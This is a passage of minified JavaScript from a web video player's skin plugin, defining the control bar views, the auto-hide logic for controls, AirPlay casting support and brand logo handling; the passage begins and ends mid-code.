md.instance},md.__super__=Xb,md.prototype=Ja(Xb.prototype,{variables:null,skinStyle:null,elements:null,views:null,skinLayout:null,controllers:null,startSplashType:null,endSplashType:null,create:function(){aa.add(this.context,"mediaMetadataData",U(this,this.onData)),B.add(this.context,"setupError",U(this,this.onError)),B.add(this.context,"mediaError",U(this,this.onError)),h.isMobile()&&h.isiOS&&ma.addOnce(this.context,ma.DISABLE_MOUSE,U(this,this.disableMouse)),na.add(this.context,"resize",U(this,this.setSkinSize)),H.add(this.context,H.EDIT_END_SPLASH,U(this,this.onEndSplashChange))},destroy:function(){null!=this.controllers&&this.controllers.destroy(),this.controllers=null,null!=this.views&&this.views.destroy(),this.views=null,null!=this.elements&&this.elements.destroy(),this.endSplashType=this.startSplashType=this.skinLayout=this.skinStyle=this.variables=this.elements=null,Xb.prototype.destroy.call(this)},activate:function(){this.startSplashType=Ic.getConfigValue(this.variables,"startSplash"),this.endSplashType=Ic.getConfigValue(this.variables,"endSplash"),this.elements=new zc(this.skinLayout,this.skinStyle,this),this.views=new vd(this.context,this),this.views.mapElements(this.elements,this.startSplashType,this.endSplashType),this.controllers=new he(this.context),this.controllers.build(this.startSplashType,this.endSplashType),this.controllers.mapViews(this.views),this.setSkinSize(),this.controllers.init(this.variables)},onEndSplashChange:function(b){Object.prototype.hasOwnProperty.call(b.data,"endsplash")&&Object.prototype.hasOwnProperty.call(b.data,"show")?this.endSplashType!=b.data.endsplash&&(this.controllers.endSplashController.resetStateForReinit(),this.endSplashType=b.data.endsplash,this.views.initViewEndSplash(this.elements,this.endSplashType),this.controllers.initControllersEndSplash(this.endSplashType),this.controllers.mapEndSplashView(this.views),this.controllers.endSplashController.context=this.context,this.controllers.endSplashController.set_variables(this.variables),Object.prototype.hasOwnProperty.call(b.data,"fallbackData")&&(this.controllers.endSplashController.fallbackData=m.field(b.data,"fallbackData")),this.controllers.endSplashController.init(),Object.prototype.hasOwnProperty.call(b.data,"restoreData")&&this.controllers.endSplashController.restore(m.field(b.data,"restoreData")),b.data.show&&this.controllers.endSplashController.showSplash()):console.error("[SkinStage].error: Invalid EDIT_END_SPLASH event data")},setSkinSize:function(b){null==b?(pd.skinWidth=0|this.calculateWidth(),pd.skinHeight=0|this.calculateHeight()):(pd.skinWidth=0|b.data.x,pd.skinHeight=0|b.data.y),this.update()},disableMouse:function(b){this.mouseEnable&&(this.mouseEnable=!1,this.update(),T.addOnce(this.context,"playing",U(this,this.enableMouse)))},enableMouse:function(b){this.mouseEnable||(this.mouseEnable=!0,this.update())},onData:function(b){this.set_visible_with_redraw(!0)},onError:function(b){},set_width:function(b){return this._width==b||(0>b&&(b=0),this._width=b,this._percentWidth=null),this._width},set_height:function(b){return this._height==b||(0>b&&(b=0),this._height=b,this._percentHeight=null),this._height},__class__:md});var Rc=Na["bs.player.plugin.skin.SkinStateElement"]={__ename__:!0,__constructs__:null,SKIN:{_hx_name:"SKIN",_hx_index:0,__enum__:"bs.player.plugin.skin.SkinStateElement",toString:Va},BRAND_BUTTON:{_hx_name:"BRAND_BUTTON",_hx_index:1,__enum__:"bs.player.plugin.skin.SkinStateElement",toString:Va},SHARE_BUTTONS:{_hx_name:"SHARE_BUTTONS",_hx_index:2,__enum__:"bs.player.plugin.skin.SkinStateElement",toString:Va}};Rc.__constructs__=[Rc.SKIN,Rc.BRAND_BUTTON,Rc.SHARE_BUTTONS];var yc=function(){this.isBrandButtonAvailiable=this.isShareButtonsAvailiable=!1};wa["bs.player.plugin.skin.SkinState"]=yc,yc.__name__="bs.player.plugin.skin.SkinState",yc.setAvailability=function(b,c,d){if(null==yc.map&&(yc.map=new Jb),Object.prototype.hasOwnProperty.call(yc.map.h,b))var q=yc.map.h[b];else q=new Be,yc.map.h[b]=q;q.set(c,d)},yc.getAvailability=function(b,c){return!(null==yc.map||!Object.prototype.hasOwnProperty.call(yc.map.h,b))&&(!!(b=yc.map.h[b]).exists(c)&&b.get(c))},yc.prototype={isBrandButtonAvailiable:null,isShareButtonsAvailiable:null,__class__:yc};var vd=function(b,c){P.call(this),this.context=b,this.stage=c};wa["bs.player.plugin.skin.SkinViews"]=vd,vd.__name__="bs.player.plugin.skin.SkinViews",vd.__super__=P,vd.prototype=Ja(P.prototype,{clickableView:null,skinShowHideView:null,controlbarView:null,playPauseReloadButtonView:null,progressView:null,pictureInPictureButtonView:null,airPlayButtonView:null,fullscreenButtonView:null,chromecastButtonView:null,volumeView:null,subtitleView:null,audioView:null,seriesView:null,videoQualityView:null,channelsView:null,bufferSpinnerView:null,titleView:null,brandButtonView:null,shareButtonsView:null,messageWindowView:null,advertisementsView:null,splashImageView:null,startSplashView:null,endSplashView:null,stage:null,mapElements:function(b,c,d){this.skinShowHideView=new Ge(this.stage),this.skinShowHideView.titleBox=b.titleBox,this.skinShowHideView.brandButton=b.brandButton,this.skinShowHideView.controlbarBox=b.controlbarBox,this.skinShowHideView.videoQualityPopup=b.videoQualityPopup,this.skinShowHideView.volumePopup=b.volumePopup,this.skinShowHideView.progressPopup=b.progressPopup,this.skinShowHideView.shareBox=b.shareBox,this.skinShowHideView.seriesPopup=b.seriesPopup,this.skinShowHideView.channelsPopup=b.channelsPopup,this.skinShowHideView.subtitlePopup=b.subtitlePopup,this.skinShowHideView.audioPopup=b.audioPopup,this.clickableView=new Ob(this.stage),this.clickableView.root=b.clickableLayer,this.controlbarView=new He(this.stage),this.controlbarView.root=b.controlbarBox,this.controlbarView.container=b.controlbarContainer,this.playPauseReloadButtonView=new Ob(this.stage),this.playPauseReloadButtonView.root=b.playPauseReloadButton,this.progressView=new Ie(this.stage),this.progressView.controlbarBox=b.controlbarBox,this.progressView.controlbarContainer=b.controlbarContainer,this.progressView.root=b.progressbarBox,this.progressView.track=b.progressbarTrack,this.progressView.segmentList=b.progressbarSegmentList,this.progressView.markerList=b.progressbarMarkerList,this.progressView.indicator=b.progressbarIndicator,this.progressView.time=b.controlbarTimeLabel,this.progressView.timePreSpacer=b.controlbarTimePreSpacer,this.progressView.timePostSpacer=b.controlbarTimePostSpacer,this.progressView.slash=b.controlbarSlashLabel,this.progressView.duration=b.controlbarDurationLabel,this.progressView.liveButton=b.controlbarLiveButton,this.progressView.liveButtonPreSpacer=b.controlbarLivePreSpacer,this.progressView.liveButtonPostSpacer=b.controlbarLivePostSpacer,this.progressView.adLabel=b.controlbarAdLabel,this.progressView.popup=b.progressPopup,this.progressView.popupBackgroundTip=b.progressPopupBackgroundTip,this.progressView.popupBackground=b.progressPopupBackground,this.progressView.popupThumbnails=b.progressPopupThumbnails,this.progressView.popupLabel=b.progressPopupLabel,this.progressView.popupExtraLabel=b.progressPopupExtraLabel,this.pictureInPictureButtonView=new Je(this.stage),this.pictureInPictureButtonView.root=b.pictureInPictureButton,this.pictureInPictureButtonView.preSpacer=b.pictureInPicturePreSpacer,this.pictureInPictureButtonView.postSpacer=b.pictureInPicturePostSpacer,this.airPlayButtonView=new Ke(this.stage),this.airPlayButtonView.root=b.airPlayButton,this.airPlayButtonView.preSpacer=b.airPlayPreSpacer,this.airPlayButtonView.postSpacer=b.airPlayPostSpacer,this.fullscreenButtonView=new Le(this.stage),this.fullscreenButtonView.root=b.fullscreenButton,this.fullscreenButtonView.preSpacer=b.fullscreenButtonPreSpacer,this.fullscreenButtonView.postSpacer=b.fullscreenButtonPostSpacer,this.chromecastButtonView=new Me(this.stage),this.chromecastButtonView.root=b.chromecastButton,this.chromecastButtonView.preSpacer=b.chromecastButtonPreSpacer,this.chromecastButtonView.postSpacer=b.chromecastButtonPostSpacer,this.bufferSpinnerView=new Ob(this.stage),this.bufferSpinnerView.root=b.bufferSpinner,this.brandButtonView=new Ne(this.stage),this.brandButtonView.root=b.brandButtonBox,this.brandButtonView.titleBox=b.titleBox,this.brandButtonView.titleLabel=b.titleLabel,this.brandButtonView.controlbarBox=b.controlbarBox,this.brandButtonView.button=b.brandButton,this.titleView=new Oe(this.stage),this.titleView.root=b.titleBox,this.titleView.title=b.titleLabel,this.titleView.subtitle=b.titleSublabel,this.shareButtonsView=new Pe(this.stage),this.shareButtonsView.root=b.shareBox,this.shareButtonsView.embed=b.shareButtonEmbed,this.shareButtonsView.mail=b.shareButtonMail,this.shareButtonsView.facebook=b.shareButtonFacebook,this.shareButtonsView.twitter=b.shareButtonTwitter,this.shareButtonsView.linkedIn=b.shareButtonLinkedIn,this.volumeView=new Qe(this.stage),this.volumeView.root=b.volumeButton,this.volumeView.preSpacer=b.volumeButtonPreSpacer,this.volumeView.postSpacer=b.volumeButtonPostSpacer,this.volumeView.popup=b.volumePopup,this.volumeView.indicator=b.volumeIndicator,this.volumeView.progress=b.volumeProgress,this.volumeView.track=b.volumeTrack,this.audioView=new rd(this.stage),this.audioView.root=b.audioButton,this.audioView.preSpacer=b.audioButtonPreSpacer,this.audioView.postSpacer=b.audioButtonPostSpacer,this.audioView.popup=b.audioPopup,this.audioView.itemRenderer=b.audioPopupItemRenderer,this.audioView.list=b.audioList,this.subtitleView=new rd(this.stage),this.subtitleView.root=b.subtitleButton,this.subtitleView.preSpacer=b.subtitleButtonPreSpacer,this.subtitleView.postSpacer=b.subtitleButtonPostSpacer,this.subtitleView.popup=b.subtitlePopup,this.subtitleView.itemRenderer=b.subtitlePopupItemRenderer,this.subtitleView.list=b.subtitleList,this.videoQualityView=new rd(this.stage),this.videoQualityView.root=b.videoQualityButton,this.videoQualityView.preSpacer=b.videoQualityButtonPreSpacer,this.videoQualityView.postSpacer=b.videoQualityButtonPostSpacer,this.videoQualityView.popup=b.videoQualityPopup,this.videoQualityView.list=b.videoQualityPopupList,this.videoQualityView.itemRenderer=b.videoQualityPopupItemRenderer,this.seriesView=new Re(this.stage),this.seriesView.root=b.seriesButton,this.seriesView.preSpacer=b.seriesButtonPreSpacer,this.seriesView.postSpacer=b.seriesButtonPostSpacer,this.seriesView.popup=b.seriesPopup,this.seriesView.list=b.seriesList,this.seriesView.itemRenderer=b.seriesPopupItemRenderer,this.seriesView.listButtonLeft=b.seriesPopupLeftButton,this.seriesView.listButtonRight=b.seriesPopupRightButton,this.seriesView.title=b.seriesPopupTitle,this.seriesView.spinner=b.seriesBufferSpinner,this.channelsView=new rd(this.stage),this.channelsView.root=b.channelsButton,this.channelsView.preSpacer=b.channelsButtonPreSpacer,this.channelsView.postSpacer=b.channelsButtonPostSpacer,this.channelsView.popup=b.channelsPopup,this.channelsView.list=b.channelsList,this.channelsView.itemRenderer=b.channelsPopupItemRenderer,this.messageWindowView=new Se(this.stage),this.messageWindowView.root=b.messageHolder,this.messageWindowView.window=b.messageWindow,this.messageWindowView.title=b.messageTitle,this.messageWindowView.titleBar=b.messageTitleBar,this.messageWindowView.text=b.messageText,this.messageWindowView.textDetails=b.messageTextDetails,this.messageWindowView.close=b.messageClose,this.messageWindowView.userSingleActionButton=b.messageUserSingleActionButton,this.messageWindowView.userSingleActionButtonText=b.messageUserSingleActionButtonText,this.advertisementsView=new Te(this.stage),this.advertisementsView.root=b.advertisementsHolder,this.advertisementsView.bar=b.advertisementsBar,this.advertisementsView.title=b.advertisementsLabel,this.advertisementsView.time=b.advertisementsTime,this.advertisementsView.counter=b.advertisementsCounter,this.advertisementsView.play=b.advertisementsPlayButton,this.advertisementsView.mute=b.advertisementsMuteButton,this.advertisementsView.close=b.advertisementsCloseButton,this.advertisementsView.click=b.advertisementsClick,this.advertisementsView.closeSpacer=b.advertisementsCloseButtonSpacer,this.splashImageView=new Ue(this.stage),this.splashImageView.root=b.splashImageContainer,this.splashImageView.image=b.splashImageHolder,this.initViewStartSplash(b,d),this.initViewEndSplash(b,d)},initViewStartSplash:function(b,c){this.startSplashView=new sd(this.stage),this.startSplashView.root=b.splashHolder,fb.__cast(this.startSplashView,sd).button=b.startSplashDefaultPlayButton,fb.__cast(this.startSplashView,sd).pauseButton=b.startSplashDefaultPauseButton},initViewEndSplash:function(b,c){switch(c){case"countdown":this.endSplashView=new cd(this.stage),this.endSplashView.root=b.splashHolder,fb.__cast(this.endSplashView,cd).box=b.endSplashCountdownBox,fb.__cast(this.endSplashView,cd).content=b.EndSplashCountdownContent,fb.__cast(this.endSplashView,cd).leftPanel=b.endSplashCountdownLeft,fb.__cast(this.endSplashView,cd).imageContainer=b.endSplashCountdownImageContainer,fb.__cast(this.endSplashView,cd).imageHolder=b.endSplashCountdownImageHolder,fb.__cast(this.endSplashView,cd).imageSpinner=b.endSplashCountdownImageSpinner,fb.__cast(this.endSplashView,cd).rightPanel=b.endSplashCountdownRight,fb.__cast(this.endSplashView,cd).title=b.endSplashCountdownTitle,fb.__cast(this.endSplashView,cd).counter=b.endSplashCountdownCounter,fb.__cast(this.endSplashView,cd).button=b.endSplashCountdownButton;break;case"social":this.endSplashView=new Dd(this.stage),this.endSplashView.root=b.splashHolder,fb.__cast(this.endSplashView,Dd).embed=b.endSplashSocialEmbed,fb.__cast(this.endSplashView,Dd).mail=b.endSplashSocialMail,fb.__cast(this.endSplashView,Dd).facebook=b.endSplashSocialFacebook,fb.__cast(this.endSplashView,Dd).twitter=b.endSplashSocialTwitter,fb.__cast(this.endSplashView,Dd).linkedIn=b.endSplashSocialLinkedIn;break;case"tiles":this.endSplashView=new Ld(this.stage),this.endSplashView.root=b.splashHolder,fb.__cast(this.endSplashView,Ld).box=b.endSplashTilesBox,fb.__cast(this.endSplashView,Ld).tiles=b.endSplashTiles,fb.__cast(this.endSplashView,Ld).itemRenderer=b.endSplashTilesItemRenderer,fb.__cast(this.endSplashView,Ld).gapRenderer=b.endSplashTilesItemGapRenderer;break;default:this.endSplashView=new sd(this.stage),this.endSplashView.root=b.splashHolder,fb.__cast(this.endSplashView,sd).button=b.endSplashDefaultReloadButton,fb.__cast(this.endSplashView,sd).imageContainer=b.endSplashImageContainer,fb.__cast(this.endSplashView,sd).image=b.endSplashImageHolder}},destroy:function(){var b=fb.getClass(this);b=g.getInstanceFields(b);for(var c=0;c<b.length;){var d=b[c];++c,(d=m.field(this,d))instanceof Ob&&fb.__cast(d,Ob).destroy()}},__class__:vd});var zb=function(){this.isViewRootBuild=!1,P.call(this)};wa["bs.player.plugin.skin.controller.core.SkinController"]=zb,zb.__name__="bs.player.plugin.skin.controller.core.SkinController",zb.__super__=P,zb.prototype=Ja(P.prototype,{variables:null,isViewRootBuild:null,view:null,mapView:function(b){this.view=b},init:function(){this.isViewRootBuild=!1},destroy:function(){this.destroyRoot(),null!=this.view&&this.view.destroy(),this.view=null,this.set_variables(null),this.isViewRootBuild=!1},buildRoot:function(b){null==b&&(b=!1),this.isViewRootBuild||null==this.view||null==this.view.root||(this.view.root.buildNativeElement(b),this.isViewRootBuild=!0,null!=this.view.root.parent&&fb.__cast(this.view.root.parent,Xb).update())},destroyRoot:function(){this.isViewRootBuild&&null!=this.view&&null!=this.view.root&&(this.isViewRootBuild=!1,this.view.root.destroyNativeElement(),null!=this.view.root.parent&&fb.__cast(this.view.root.parent,Xb).update())},set_variables:function(b){return this.variables=b},__class__:zb,__properties__:{set_variables:"set_variables"}});var ed=function(){this.logoVisibleDuringAdPlayback=!1,this.logoAutohide=!0,this.lastMousePosition=new Vb,this.lastTime=0,this.canHideSkin=this.isPlaying=this.isAdPlayback=this.isMouseDetection=this.isVideoCasting=!1,zb.call(this)};wa["bs.player.plugin.skin.controller.animation.HideShowElementsController"]=ed,ed.__name__="bs.player.plugin.skin.controller.animation.HideShowElementsController",ed.__super__=zb,ed.prototype=Ja(zb.prototype,{canHideSkin:null,isPlaying:null,isAdPlayback:null,isMouseDetection:null,isVideoCasting:null,timer:null,lastTime:null,lastMousePosition:null,showHideView:null,logoAutohide:null,logoVisibleDuringAdPlayback:null,init:function(){var b=this;zb.prototype.init.call(this),this.showHideView=this.view,ed.autoHideTimeout=500;var c=Ic.getConfigValue(this.variables,"logoAutohide");null!=c&&(this.logoAutohide=c),null!=(c=Ic.getConfigValue(this.variables,"logoVisibleDuringAdPlayback"))&&(this.logoVisibleDuringAdPlayback=c),h.isMobile()&&(ed.autoHideTimeout=2e3),this.lastTime=0,this.timer=new Rb(100),this.timer.run=U(this,this.onTimer),this.hide(!1,!0),T.add(this.context,"playing",U(this,this.onPlaying)),T.add(this.context,"paused",U(this,this.onPaused)),T.add(this.context,"stopped",U(this,this.onStopped)),T.add(this.context,"complete",U(this,this.onComplete)),T.add(this.context,"seekingStart",U(this,this.onSeekingStart)),T.add(this.context,"videoCastingStart",U(this,this.onVideoCastingStart)),T.add(this.context,"videoCastingEnd",U(this,this.onVideoCastingEnd)),c=!1,Object.prototype.hasOwnProperty.call(this.variables,"keepSkinOnAd")&&(c=1==m.field(this.variables,"keepSkinOnAd")),c||(Q.add(this.context,"adDisableControls",U(this,this.onSkinHideDurringAdPlayback)),Q.add(this.context,"adEnableControls",U(this,this.onSkinShowAfterAdPlayback))),this.logoVisibleDuringAdPlayback||(Q.add(this.context,"adDisableControls",U(this,this.onLogoHideDurringAdPlayback)),Q.add(this.context,"adEnableControls",U(this,this.onLogoShowAfterAdPlayback))),ma.add(this.context,ma.ANIMATE_SHOW,(function(d){b.show()})),aa.add(this.context,"mediaMetadataData",U(this,this.onDataAdded)),na.add(this.context,"repaint",U(this,this.onRepaintRequest)),h.mobile&&this.view.stage.addEventListener("touchmove",U(this,this.onMouseMove))},destroy:function(){var b=this;null!=this.timer&&this.timer.stop(),T.remove(this.context,"playing",U(this,this.onPlaying)),T.remove(this.context,"paused",U(this,this.onPaused)),T.remove(this.context,"stopped",U(this,this.onStopped)),T.remove(this.context,"complete",U(this,this.onComplete)),T.remove(this.context,"videoCastingStart",U(this,this.onVideoCastingStart)),T.remove(this.context,"videoCastingEnd",U(this,this.onVideoCastingEnd)),Q.remove(this.context,"adDisableControls",U(this,this.onSkinHideDurringAdPlayback)),Q.remove(this.context,"adEnableControls",U(this,this.onSkinShowAfterAdPlayback)),Q.remove(this.context,"adDisableControls",U(this,this.onLogoHideDurringAdPlayback)),Q.remove(this.context,"adEnableControls",U(this,this.onLogoShowAfterAdPlayback)),ma.remove(this.context,ma.ANIMATE_SHOW,(function(c){b.show()})),aa.remove(this.context,"mediaMetadataData",U(this,this.onDataAdded)),na.remove(this.context,"repaint",U(this,this.onRepaintRequest)),h.mobile&&this.view.stage.removeEventListener("touchmove",U(this,this.onMouseMove)),this.timer=null,this.showHideView=this.lastMousePosition=this.lastTime=this.isMouseDetection=this.isPlaying=this.canHideSkin=ed.autoHideTimeout=null,zb.prototype.destroy.call(this)},onDataAdded:function(b){this.isVideoCasting||0!=Ic.getConfigValue(this.variables,"showSkinOnInit")?(this.canHideSkin=!1,this.show()):(this.canHideSkin=!0,this.hide(!1,!0)),this.isMouseDetection&&this.view.stage.hasEventListener("mousemove")&&this.view.stage.removeEventListener("mousemove",U(this,this.onMouseMove)),this.isMouseDetection=!1},onPlaying:function(b){this.isPlaying=!0,this.isMouseDetection||(this.isMouseDetection=!0,this.view.stage.addEventListener("mousemove",U(this,this.onMouseMove))),this.canHideSkin=!this.isVideoCasting},onPaused:function(b){this.isPlaying=!1,this.show()},onStopped:function(b){this.isPlaying=!1,this.show()},onSeekingStart:function(b){this.show()},onComplete:function(b){this.canHideSkin=this.isPlaying=!1,this.show()},onVideoCastingStart:function(b){this.canHideSkin=!1,this.isVideoCasting=!0,this.show()},onVideoCastingEnd:function(b){this.canHideSkin=!0,this.isVideoCasting=!1,this.show()},onSkinHideDurringAdPlayback:function(b){this.isAdPlayback=!0,this.disableMouseAndEvents(),yc.setAvailability(this.context,Rc.SKIN,!1),this.hide(!1,!0)},disableMouseAndEvents:function(){T.remove(this.context,"playing",U(this,this.onPlaying)),T.remove(this.context,"complete",U(this,this.onComplete)),this.view.stage.hasEventListener("mousemove")&&this.view.stage.removeEventListener("mousemove",U(this,this.onMouseMove)),this.isMouseDetection=!1},onSkinShowAfterAdPlayback:function(b){this.isAdPlayback=!1,this.enableMouseAndEvents(),yc.getAvailability(this.context,Rc.SKIN)||this.show(!1)},onLogoHideDurringAdPlayback:function(b){this.hideElement(this.showHideView.brandButton,!1)},onLogoShowAfterAdPlayback:function(b){this.showElement(this.showHideView.brandButton,!1)},enableMouseAndEvents:function(){T.add(this.context,"playing",U(this,this.onPlaying)),T.add(this.context,"complete",U(this,this.onComplete)),this.view.stage.hasEventListener("mousemove")||this.view.stage.addEventListener("mousemove",U(this,this.onMouseMove)),this.isMouseDetection=!0},hide:function(b,c){null==c&&(c=!1),null==b&&(b=!0);var d=this;(c||!(yc.getAvailability(this.context,Rc.SKIN)||this.showHideView.channelsPopup.visible||this.showHideView.volumePopup.visible||this.showHideView.subtitlePopup.visible||this.showHideView.audioPopup.visible||this.showHideView.seriesPopup.visible||this.showHideView.progressPopup.visible||null!=this.showHideView.videoQualityPopup&&this.showHideView.videoQualityPopup.visible)&&this.canHideSkin)&&(c&&(this.hideElement(this.showHideView.channelsPopup,!1),this.hideElement(this.showHideView.volumePopup,!1),this.hideElement(this.showHideView.subtitlePopup,!1),this.hideElement(this.showHideView.audioPopup,!1),this.hideElement(this.showHideView.seriesPopup,!1),this.hideElement(this.showHideView.progressPopup,!1),this.hideElement(this.showHideView.videoQualityPopup,!1)),this.hideElement(this.showHideView.titleBox,b),this.hideElement(this.showHideView.shareBox,b),null!=this.showHideView.brandButton&&this.logoAutohide&&this.hideElement(this.showHideView.brandButton,b),this.hideElement(this.showHideView.controlbarBox,b,(function(){var q=new W("skinControlbarHidden");q.data={isInitialCall:!b&&c},q.dispatch(d.context)})),this.isPlaying&&this.view.stage.isNativeElement()&&null!=this.view.stage.element.instance.classList&&(this.view.stage.element.instance.classList.remove("defaultCursor"),this.view.stage.element.instance.classList.add("noneCursor")),yc.setAvailability(this.context,Rc.SKIN,!0),new W("skinControlbarHide").dispatch(this.context))},show:function(b){null==b&&(b=!0),yc.getAvailability(this.context,Rc.SKIN)&&!this.isAdPlayback&&(this.lastTime=0,this.showElement(this.showHideView.controlbarBox,b),this.showElement(this.showHideView.titleBox,b,!0),null!=this.showHideView.brandButton&&(yc.getAvailability(this.context,Rc.BRAND_BUTTON)?this.showElement(this.showHideView.brandButton,b):this.logoAutohide&&this.hideElement(this.showHideView.brandButton,!1)),null!=this.showHideView.shareBox&&(yc.getAvailability(this.context,Rc.SHARE_BUTTONS)?this.showElement(this.showHideView.shareBox,b):this.hideElement(this.showHideView.shareBox,!1)),this.view.stage.isNativeElement()&&null!=this.view.stage.element.instance.classList&&(this.view.stage.visible||(this.view.stage.visible=!0),this.view.stage.element.instance.classList.add("defaultCursor"),this.view.stage.element.instance.classList.remove("noneCursor")),yc.setAvailability(this.context,Rc.SKIN,!1),new W("skinControlbarShow").dispatch(this.context),null!=this.showHideView.controlbarBox&&this.showHideView.controlbarBox.update())},hideElement:function(b,c,d){null==c&&(c=!0),null!=b&&(Vc.stop(b),c?Vc.tween(b,h.isMobile()?2e3:1e3,{alpha:0}).delay(h.isMobile()?4e3:6e3).onComplete((function(){b.alpha=0,b.visible=!1,b.destroyNativeElement(),null!=d&&d()})):(b.alpha=0,b.visible=!1,b.destroyNativeElement(),null!=d&&d()))},execHideElement:function(b,c){b.alpha=0,b.visible=!1,b.destroyNativeElement(),null!=c&&c()},onMouseMove:function(b){b.mouseX==this.lastMousePosition.x&&b.mouseY==this.lastMousePosition.y||(this.lastTime=0,this.show(),this.lastMousePosition.x=b.mouseX,this.lastMousePosition.y=b.mouseY)},showElement:function(b,c,d){null==d&&(d=!1),null==c&&(c=!0),null!=b&&(b.alpha=c?0:1,b.visible=!0,b.buildNativeElement(),d&&b.redrawCall(),Vc.stop(b),c&&Vc.tween(b,200,{alpha_with_redraw:1}))},onTimer:function(){0==this.canHideSkin?this.lastTime=0:(this.lastTime+=50,this.lastTime>ed.autoHideTimeout&&this.hide())},onRepaintRequest:function(b){this.show()},__class__:ed});var wd=function(){zb.call(this),this.shouldResumePlayback=this.isAvailable=this.airPlayButtonVisible=!1};wa["bs.player.plugin.skin.controller.element.AirPlayController"]=wd,wd.__name__="bs.player.plugin.skin.controller.element.AirPlayController",wd.__super__=zb,wd.prototype=Ja(zb.prototype,{htmlVideo:null,airPlayButtonVisible:null,isAvailable:null,shouldResumePlayback:null,shouldResumePlaybackTimer:null,init:function(){var b=Ic.getConfigValue(this.variables,"videoCastEnabled");null!=b&&(this.airPlayButtonVisible=b),zb.prototype.init.call(this),T.add(this.context,"videoMediaElementInit",U(this,this.onVideoMediaElementInit)),T.add(this.context,"playing",U(this,this.onVideoPlaying)),T.add(this.context,"paused",U(this,this.onVideoPaused)),this.checkButtonVisibility()},destroy:function(){T.remove(this.context,"videoMediaElementInit",U(this,this.onVideoMediaElementInit)),T.remove(this.context,"playing",U(this,this.onVideoPlaying)),T.remove(this.context,"currentTimeChange",U(this,this.onVideoMetadataLoaded)),zb.prototype.destroy.call(this)},showButton:function(){null!=this.view&&null!=this.view.root&&(this.view.root.removeEventListener("click",U(this,this.onButtonClick)),this.view.root.addEventListener("click",U(this,this.onButtonClick)),this.view.root.visible=!0,this.showSpacers(!0),this.buildRoot(!0))},showSpacers:function(b){if(null!=this.view&&null!=this.view.root){var c=this.view;null!=c.preSpacer&&(c.preSpacer.visible=b),null!=c.postSpacer&&(c.postSpacer.visible=b)}},hideButton:function(){null!=this.view&&null!=this.view.root&&(this.showSpacers(!1),this.view.root.removeEventListener("click",U(this,this.onButtonClick)),this.view.root.visible=!1,this.destroyRoot())},onButtonClick:function(b){this.openAirplayMenu()},onVideoMediaElementInit:function(b){this.htmlVideo=b.data,null!=this.htmlVideo&&this.isCastingSupportedByDevice()&&(this.htmlVideo.addEventListener("webkitplaybacktargetavailabilitychanged",U(this,this.onAirplayAvailabilityChange)),this.htmlVideo.addEventListener("webkitcurrentplaybacktargetiswirelesschanged",U(this,this.onAirplayPlaybackUpdate)))},onAirplayAvailabilityChange:function(b){return null!=b&&(this.isAvailable="available"==b.availability,this.checkButtonVisibility()),null},onAirplayPlaybackUpdate:function(b){return this.shouldResumePlayback=this.htmlVideo.webkitCurrentPlaybackTargetIsWireless,this.stopTokenTimer(),this.shouldResumePlaybackTimer=Rb.delay(U(this,this.onTokenTimeout),1500),(this.shouldResumePlayback?new T("videoCastingStart"):new T("videoCastingEnd")).dispatch(this.context),null},stopTokenTimer:function(){null!=this.shouldResumePlaybackTimer&&(this.shouldResumePlaybackTimer.stop(),this.shouldResumePlaybackTimer=null)},onTokenTimeout:function(){this.stopTokenTimer(),this.shouldResumePlayback=!1},onVideoPlaying:function(b){this.checkButtonVisibility(),T.addOnce(this.context,"currentTimeChange",U(this,this.onVideoMetadataLoaded))},onVideoPaused:function(b){this.shouldResumePlayback&&(this.stopTokenTimer(),this.shouldResumePlayback=!1,new W("skinPlay").dispatch(this.context))},onVideoMetadataLoaded:function(b){this.checkButtonVisibility()},checkButtonVisibility:function(){this.airPlayButtonVisible&&this.isAvailable?this.showButton():this.hideButton()},isCastingSupportedByDevice:function(){return"WebKitPlaybackTargetAvailabilityEvent"in window},openAirplayMenu:function(){this.isCastingSupportedByDevice()&&this.isAvailable?this.htmlVideo.webkitShowPlaybackTargetPicker():this.log("Casting with air play is currently not available.","warn")},log:function(b,c){null==c&&(c="log"),console&&("error"==c?console.error(b):"warn"==c?console.warn(b):console.log(b))},__class__:wd});var ie=function(){this.bottomOffset=0,this.logoMaxHeightToScreenRatio=.2,this.logoMaxWidthToScreenRatio=.1,this.logoXPosition="left",this.logoYPosition="top",zb.call(this)};wa["bs.player.plugin.skin.controller.element.BrandButtonController"]=ie,ie.__name__="bs.player.plugin.skin.controller.element.BrandButtonController",ie.__super__=zb,ie.prototype=Ja(zb.prototype,{logoFile:null,logoLink:null,logoLinkTarget:null,logoOriginalSize:null,logoYPosition:null,logoXPosition:null,logoMaxWidthToScreenRatio:null,logoMaxHeightToScreenRatio:null,bottomOffset:null,brandButtonView:null,init:function(){if(this.brandButtonView=this.view,null!=this.brandButtonView.button){zb.prototype.init.call(this),this.logoFile=Ic.getConfigValue(this.variables,"logoFile"),this.logoLink=Ic.getConfigValue(this.variables,"logoLink"),this.logoLinkTarget=Ic.getConfigValue(this.variables,"logoLinkTarget"),this.logoYPosition=Ic.getConfigValue(this.variables,"logoYPosition"),this.logoXPosition=Ic.getConfigValue(this.variables,"logoXPosition");var b=Ic.getConfigValue(this.variables,"logoMaxWidthToScreenRatio"),c=Ic.getConfigValue(this.variables,"logoMaxHeightToScreenRatio");null!=b&&(this.logoMaxWidthToScreenRatio=b),null!=c&&(this.logoMaxWidthToScreenRatio=c),this.setupImage(),W.add(this.context,"skinControlbarHidden",U(this,this.handleSkinHidden)),W.add(this.context,"skinControlbarShow",U(this,this.handleSkinShow))}},destroy:function(){W.remove(this.context,"skinControlbarHidden",U(this,this.handleSkinHidden)),W.remove(this.context,"skinControlbarShow",U(this,this.handleSkinShow)),zb.prototype.destroy.call(this)},handleSkinHidden:function(b){this.bottomOffset=0,"bottom"==this.logoYPosition&&this.updateImage()},handleSkinShow:function(b){this.updateBottomOffset(),"bottom"==this.logoYPosition&&this.updateImage()},destroyImage:function(){na.remove(this.context,"resize",U(this,this.updateImagePosition)),this.logoFile=this.logoOriginalSize=null,this.view.root.visible=!1,this.brandButtonView.button.set_icon(null),this.brandButtonView.button.set_onClickUrlTarget(null),this.brandButtonView.button.set_onClickUrl(null),this.view.root.destroyNativeElement(),yc.setAvailability(this.context,Rc.BRAND_BUTTON,!1)},setupImage:function(){if(null==this.logoFile||""==this.logoFile)this.destroyImage();else{this.brandButtonView.button.image.onLoadError=U(this,this.destroyImage),this.brandButtonView.button.image.onLoad=U(this,this.updateImage),this.brandButtonView.button.set_icon(this.logoFile),null==this.logoLink||""==this.logoLink?(this.brandButtonView.button.set_onClickUrlTarget(null),this.brandButtonView.button.set_onClickUrl(null)):(this.brandBu